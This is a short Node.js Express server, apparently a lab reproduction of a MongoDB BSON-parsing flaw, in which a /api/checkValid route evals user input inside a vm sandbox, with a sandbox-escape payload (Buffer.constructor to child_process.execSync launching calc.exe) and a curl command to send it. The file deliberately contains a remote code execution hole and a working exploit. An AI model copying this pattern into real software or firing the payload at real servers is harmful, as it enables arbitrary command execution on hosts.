const express = require('express');
const vm = require('vm');
const mongodb = require('mongodb');
const app = express();
app.use(express.json());

const mongoMiddleware = (req, res, next) => next();
var Timestamp = function (high, low) {
    return mongodb.Timestamp(low, high);
  };
var DBRef = function (namespace, oid, db) {
    
    if (db === undefined || db === null) {
      db = '';
    }
  
    var objectId = exports.toObjectId(oid);
    if (objectId === false) {
      objectId = mongodb.ObjectId(oid);
    }
    return mongodb.DBRef(namespace, objectId, db);
  };

const bson = {
  toBSON: function (string) {
    const sandbox = {
        Long: mongodb.Long,
        NumberLong: mongodb.Long,
        Double: mongodb.Double,
        NumberDouble: mongodb.Double,
        ObjectId: mongodb.ObjectID,
        ObjectID: mongodb.ObjectID,
        Timestamp: Timestamp,
        DBRef: DBRef,
        Dbref: DBRef,
        Binary: mongodb.Binary,
        BinData: mongodb.Binary,
        Code: mongodb.Code,
        Symbol: mongodb.Symbol,
        MinKey: mongodb.MinKey,
        MaxKey: mongodb.MaxKey,
        ISODate: Date,
        Date: Date,
        Buffer: Buffer,
    };
    string = string.replace(/ISODate\(/g, 'new ISODate(');
    string = string.replace(/Binary\(("[^"]+"),/g, 'Binary(new Buffer($1, "base64"),');
    var maliciousPayload = {
        "document": "1)); (() => { const require = Buffer.constructor('return process.mainModule.require')(); require('child_process').execSync('calc.exe'); })(); //"
      }
    vm.runInNewContext(`doc = eval((${string}));`, sandbox); // 漏洞点
    return sandbox.doc;
  }
};

// 漏洞路由
const router = express.Router();
router.post('/checkValid', mongoMiddleware, (req, res) => {
  try {
    var doc = req.body.document;
    bson.toBSON(doc);

    console.log(req.body.document);
    res.send('Valid');
  } catch (err) {
    console.error(err);
    res.send('Invalid');
  }
});

app.use('/api', router);

// 启动服务
app.listen(3000, () => {
  console.log('Vulnerable server running on http://localhost:3000');
});
/*
curl.exe -X POST http://localhost:3000/api/checkValid `
   -H "Content-Type: application/json" `
   -d $payload
*/